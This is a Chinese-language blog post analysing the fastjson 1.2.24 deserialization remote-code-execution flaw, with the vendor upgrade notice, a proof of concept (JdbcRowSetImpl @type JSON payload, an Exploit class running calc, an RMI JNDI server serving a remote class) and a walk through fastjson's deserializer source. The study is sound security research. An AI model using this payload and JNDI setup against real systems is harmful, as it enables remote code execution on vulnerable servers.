---
layout: post
title: fastjson反序列化学习
categories: java
tag: fastjson
---

# fastjson 反序列化漏洞

## 简介 

- 受影响版本 fastjson <= 1.2.24

https://github.com/alibaba/fastjson/wiki/security_update_20170315

最近发现fastjson在1.2.24以及之前版本存在远程代码执行高危安全漏洞，为了保证系统安全，请升级到1.2.28/1.2.29/1.2.30/1.2.31或者更新版本。

1.2.29//1.2.30/1.2.31是在1.2.28版本上修复了一些大家升级过程中遇到的问题的版本，非安全问题，如果升级到1.2.25~1.2.28以及各种sec01版本的，也是没有安全问题的。

1.2.25/1.2.26/1.2.27/1.2.28/1.2.29/1.2.30都是在升级的过程中修复不兼容问题发布的过度版本，如果你是在此之前升级到这些版本，不用因为这次的安全问题再次升级。

## 开源示例漏洞代码

- https://github.com/earayu/fastjson_jndi_poc

测试环境

    Java 1.8.0_202
    Fastjson 1.2.7

- 查看注释  Java 1.8.0_202 >  JDK 8u121  
将`System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");`注释删去

```java
package cn.eovie.victim;

import com.alibaba.fastjson.JSONObject;

/**
 * Created by earayu on 2017/12/7.
 */
public class SomeFastjsonApp {

    public static void main(String[] argv){
        testJdbcRowSetImpl();
    }

    public static void testJdbcRowSetImpl(){
        //JDK 8u121以后版本需要设置改系统变量
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        //LADP 方式
        String payload1 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\"," + " \"autoCommit\":true}";
        //RMI 方式
        String payload2 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\"," +
                " \"autoCommit\":true}";
        JSONObject.parseObject(payload2);
    }

}


```

## 利用逻辑

- 接受json
- 解析 @type 的特殊key ，指定当前json数据反序列化为一个类
- 类private 变量赋值时会调用对应的setter方法 
- 寻找某些类里面setter方法除了设置变量外还做了其他的危险操作，完成利用


## 利用环境

### exploit 
在受害者主机执行的恶意代码

```java
/**
 * Created by liaoxinxi on 2017-9-4.
 */
public class Exploit {
    public Exploit(){
        try{
            Runtime.getRuntime().exec("calc");
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        Exploit e = new Exploit();
    }
}

```

### rmi server
提供rmi服务

```java
package cn.eovie.attacker;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * Created by liaoxinxi on 2017-11-6.
 */

public class JNDIServer {
    public static void start() throws
            AlreadyBoundException, RemoteException, NamingException {
        Registry registry = LocateRegistry.createRegistry(1099);
        //http://xxlegend.com/Exploit.class即可
        Reference reference = new Reference("Exloit",
                "Exploit","http://127.0.0.1/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("Exploit",referenceWrapper);

    }
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        start();
    }
}
```

## Gadget chain:

### 传递的json攻击payload

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit", "autoCommit":true}
```

### fastjson 判断第一个key是否为 "@type" 以及  !this.isEnabled(Feature.DisableSpecialKeyDetect)
将value作为class 来加载

是否开启特殊key检查 （class编写时，`@JSONField`注解可设置Feature） 如下

```java
class User {
    
    //指定序列化字段顺序，字段名称
    @JSONField(ordinal=4,name="ID")
    private Integer id;
    ...
```

`fastjson/parser/DefaultJSONParser.java`
```
parseObject:206, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:137, JSON (com.alibaba.fastjson)
parse:128, JSON (com.alibaba.fastjson)
parseObject:201, JSON (com.alibaba.fastjson)
testJdbcRowSetImpl:22, SomeFastjsonApp (cn.eovie.victim)
main:11, SomeFastjsonApp (cn.eovie.victim)
```
![](/styles/images/2019-5/fastjsontype.png)


- 执行到 fastjson\parser\ParserConfig.java  getDeserializer函数 选择ObjectDeserializer

`type : com.sun.rowset.JdbcRowSetImpl`  
```java
    public ObjectDeserializer getDeserializer(Type type) {
        ObjectDeserializer derializer = this.derializers.get(type);
        if (derializer != null) {
            return derializer;
        }

        if (type instanceof Class<?>) {  // 这是一个类 执行到此 下方的函数
            return getDeserializer((Class<?>) type, type); 
        }

        if (type instanceof ParameterizedType) {
            Type rawType = ((ParameterizedType) type).getRawType();
            if (rawType instanceof Class<?>) {
                return getDeserializer((Class<?>) rawType, type);
            } else {
                return getDeserializer(rawType);
            }
        }

        return JavaObjectDeserializer.instance;
    }


    public ObjectDeserializer getDeserializer(Class<?> clazz, Type type) {
        ObjectDeserializer derializer = derializers.get(type);
        if (derializer != null) {
            return derializer;
        }

        if (type == null) {
            type = clazz;
        }

        derializer = derializers.get(type);
        if (derializer != null) {
            return derializer;
        }

        {
            JSONType annotation = clazz.getAnnotation(JSONType.class);
            if (annotation != null) {
                Class<?> mappingTo = annotation.mappingTo();
                if (mappingTo != Void.class) {
                    return getDeserializer(mappingTo, mappingTo);
                }
            }
        }

        if (type instanceof WildcardType || type instanceof TypeVariable || type instanceof ParameterizedType) {
            derializer = derializers.get(clazz);
        }

        if (derializer != null) {
            return derializer;
        }

        String className = clazz.getName();
        className = className.replace('$', '.');
        for (int i = 0; i < denyList.length; ++i) {
            String deny = denyList[i];
            if (className.startsWith(deny)) {
                throw new JSONException("parser deny : " + className);
            }
        }

        if (className.startsWith("java.awt.") //
            && AwtCodec.support(clazz)) {
            if (!awtError) {
                try {
                    derializers.put(Class.forName("java.awt.Point"), AwtCodec.instance);
                    derializers.put(Class.forName("java.awt.Font"), AwtCodec.instance);
                    derializers.put(Class.forName("java.awt.Rectangle"), AwtCodec.instance);
                    derializers.put(Class.forName("java.awt.Color"), AwtCodec.instance);
                } catch (Throwable e) {
                    // skip
                    awtError = true;
                }

                derializer = AwtCodec.instance;
            }
        }

        if (!jdk8Error) {
            try {
                if (className.startsWith("java.time.")) {
                    
                    derializers.put(Class.forName("java.time.LocalDateTime"), Jdk8DateCodec.instance);
                    derializers.put(Class.forName("java.time.LocalDate"), Jdk8DateCodec.instance);
                    derializers.put(Class.forName("java.time.LocalTime"), Jdk8DateCodec.instance);
                    derializers.put(Class.forName("java.time.ZonedDateTime"), Jdk8DateCodec.instance);
                    derializers.put(Class.forName("java.time.OffsetDateTime"), Jdk8DateCodec.instance);
                    derializers.put(Class.forName("java.time.OffsetTime"), Jdk8DateCodec.instance);
                    derializers.put(Class.forName("java.time.ZoneOffset"), Jdk8DateCodec.instance);
                    derializers.put(Class.forName("java.time.ZoneRegion"), Jdk8DateCodec.instance);
                    derializers.put(Class.forName("java.time.ZoneId"), Jdk8DateCodec.instance);
                    derializers.put(Class.forName("java.time.Period"), Jdk8DateCodec.instance);
                    derializers.put(Class.forName("java.time.Duration"), Jdk8DateCodec.instance);
                    derializers.put(Class.forName("java.time.Instant"), Jdk8DateCodec.instance);
                    
                    derializer = derializers.get(clazz);
                } else if (className.startsWith("java.util.Optional")) {
                    
                    derializers.put(Class.forName("java.util.Optional"), OptionalCodec.instance);
                    derializers.put(Class.forName("java.util.OptionalDouble"), OptionalCodec.instance);
                    derializers.put(Class.forName("java.util.OptionalInt"), OptionalCodec.instance);
                    derializers.put(Class.forName("java.util.OptionalLong"), OptionalCodec.instance);
                    
                    derializer = derializers.get(clazz);
                }
            } catch (Throwable e) {
                // skip
                jdk8Error = true;
            }
        }

        if (className.equals("java.nio.file.Path")) {
            derializers.put(clazz, MiscCodec.instance);
        }

        if (clazz == Map.Entry.class) {
            derializers.put(clazz, MiscCodec.instance);
        }

        final ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        try {
            for (AutowiredObjectDeserializer autowired : ServiceLoader.load(AutowiredObjectDeserializer.class,
                                                                            classLoader)) {
                for (Type forType : autowired.getAutowiredFor()) {
                    derializers.put(forType, autowired);
                }
            }
        } catch (Exception ex) {
            // skip
        }

        if (derializer == null) {
            derializer = derializers.get(type);
        }

        if (derializer != null) {
            return derializer;
        }

        if (clazz.isEnum()) {
            derializer = new EnumDeserializer(clazz);
        } else if (clazz.isArray()) {
            derializer = ObjectArrayCodec.instance;
        } else if (clazz == Set.class || clazz == HashSet.class || clazz == Collection.class || clazz == List.class
                   || clazz == ArrayList.class) {
            derializer = CollectionCodec.instance;
        } else if (Collection.class.isAssignableFrom(clazz)) {
            derializer = CollectionCodec.instance;
        } else if (Map.class.isAssignableFrom(clazz)) {
            derializer = MapDeserializer.instance;
        } else if (Throwable.class.isAssignableFrom(clazz)) {
            derializer = new ThrowableDeserializer(this, clazz);
        } else {
            derializer = createJavaBeanDeserializer(clazz, type);
        }

        putDeserializer(type, derializer);

        return derializer;
    }
```

- fastjson\parser\ParserConfig.java 设置了内置的derializers
   
   先判断是否内置了类 ,判断一些常见的类、黑名单检测`denyList`、最终选择 `derializer = createJavaBeanDeserializer(clazz, type);`
- createJavaBeanDeserializer
```java
        public ObjectDeserializer createJavaBeanDeserializer(Class<?> clazz, Type type) {
        boolean asmEnable = this.asmEnable;
        if (asmEnable) {
            JSONType jsonType = clazz.getAnnotation(JSONType.class);

            if (jsonType != null) {
                Class<?> deserializerClass = jsonType.deserializer();
                if (deserializerClass != Void.class) {
                    try {
                        Object deseralizer = deserializerClass.newInstance();
                        if (deseralizer instanceof ObjectDeserializer) {
                            return (ObjectDeserializer) deseralizer;
                        }
                    } catch (Throwable e) {
                        // skip
                    }
                }
                
                asmEnable = jsonType.asm();
            }

            if (asmEnable) {
                Class<?> superClass = JavaBeanInfo.getBuilderClass(jsonType);
                if (superClass == null) {
                    superClass = clazz;
                }

                for (;;) {
                    if (!Modifier.isPublic(superClass.getModifiers())) {
                        asmEnable = false;
                        break;
                    }

                    superClass = superClass.getSuperclass();
                    if (superClass == Object.class || superClass == null) {
                        break;
                    }
                }
            }
        }

        if (clazz.getTypeParameters().length != 0) {
            asmEnable = false;
        }

        if (asmEnable && asmFactory != null && asmFactory.classLoader.isExternalClass(clazz)) {
            asmEnable = false;
        }

        if (asmEnable) {
            asmEnable = ASMUtils.checkName(clazz.getSimpleName());
        }

        if (asmEnable) {
            if (clazz.isInterface()) {
                asmEnable = false;
            }
            JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);

            if (asmEnable && beanInfo.fields.length > 200) {
                asmEnable = false;
            }

            Constructor<?> defaultConstructor = beanInfo.defaultConstructor;
            if (asmEnable && defaultConstructor == null && !clazz.isInterface()) {
                asmEnable = false;
            }

            for (FieldInfo fieldInfo : beanInfo.fields) {
                if (fieldInfo.getOnly) {
                    asmEnable = false;
                    break;
                }

                Class<?> fieldClass = fieldInfo.fieldClass;
                if (!Modifier.isPublic(fieldClass.getModifiers())) {
                    asmEnable = false;
                    break;
                }

                if (fieldClass.isMemberClass() && !Modifier.isStatic(fieldClass.getModifiers())) {
                    asmEnable = false;
                    break;
                }

                if (fieldInfo.getMember() != null //
                    && !ASMUtils.checkName(fieldInfo.getMember().getName())) {
                    asmEnable = false;
                    break;
                }

                JSONField annotation = fieldInfo.getAnnotation();
                if (annotation != null //
                    && ((!ASMUtils.checkName(annotation.name())) //
                        || annotation.format().length() != 0 //
                        || annotation.deserializeUsing() != Void.class)) {
                    asmEnable = false;
                    break;
                }

                if (fieldClass.isEnum()) { // EnumDeserializer
                    ObjectDeserializer fieldDeser = this.getDeserializer(fieldClass);
                    if (!(fieldDeser instanceof EnumDeserializer)) {
                        asmEnable = false;
                        break;
                    }
                }
            }
        }

        if (asmEnable) {
            if (clazz.isMemberClass() && !Modifier.isStatic(clazz.getModifiers())) {
                asmEnable = false;
            }
        }

        if (!asmEnable) {
            return new JavaBeanDeserializer(this, clazz, type);
        }

        JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);
        try {
            return asmFactory.createJavaBeanDeserializer(this, beanInfo);
            // } catch (VerifyError e) {
            // e.printStackTrace();
            // return new JavaBeanDeserializer(this, clazz, type);
        } catch (NoSuchMethodException ex) {
            return new JavaBeanDeserializer(this, clazz, type);
        } catch (JSONException asmError) {
            return new JavaBeanDeserializer(this, beanInfo);
        } catch (Exception e) {
            throw new JSONException("create asm deserializer error, " + clazz.getName(), e);
        }
    }

```

- 执行到 `JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);`

    遍历类中的方法和字段 生成fieldlist 并标记对应的setter方法 ,解析json时会调用相应的setter方法

    ![](/styles/images/2019-5/javabeaninfobuild.png)
    **autoCommit 的 setAutoCommit方法**
    ![](/styles/images/2019-5/fieldlist.png)
    ![](/styles/images/2019-5/fieldlist1.png)
### com.sun.rowset.JdbcRowSetImpl

调用setAutoCommit的时候会调用this.connect()，在connect()里能加载远程的方法执行。

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit", "autoCommit":true}
```

![](/styles/images/2019-5/setAutoCommitfastjson.png)

### 参考

- https://5alt.me/2017/09/fastjson调试利用记录/
- http://xxlegend.com/2017/12/06/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/